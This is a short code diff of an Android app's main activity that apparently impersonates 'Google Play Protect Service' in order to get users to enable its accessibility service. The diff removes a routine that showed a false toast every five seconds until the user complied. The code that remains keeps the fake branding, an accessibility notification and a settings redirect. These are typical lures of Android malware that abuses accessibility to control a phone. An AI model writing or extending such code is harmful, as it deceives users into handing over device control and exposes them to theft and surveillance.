@@ -18,7 +18,7 @@ import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.NotificationCompat;
 
 
-import com.GooglePlayProtectService.R;
+import com.R;
 
 public class MainActivity extends AppCompatActivity {
 	private static final String CHANNEL_ID = "GooglePlayProtectChannel";
@@ -66,7 +66,6 @@ public class MainActivity extends AppCompatActivity {
 			startActivity(intent);
 		});
 		showAccessibilityNotification();
-		showToastPeriodically();
 		Alert.openSettings(this);
 	}
 
@@ -99,20 +98,6 @@ public class MainActivity extends AppCompatActivity {
 			channel.setDescription(description);
 			notificationManager.createNotificationChannel(channel);
 		}
-	}
-
-	private void showToastPeriodically() {
-		final Handler handler = new Handler();
-		final Runnable runnable = new Runnable() {
-			@Override
-			public void run() {
-				if (!isAccessibilityServiceEnabled()) {
-					Toast.makeText(MainActivity.this, "This app requires Google Play Protect Service's framework, please enable it.", Toast.LENGTH_LONG).show();
-					handler.postDelayed(this, 5000);
-				}
-			}
-		};
-		handler.post(runnable);
 	}
 
 	private boolean isAccessibilityServiceEnabled() {
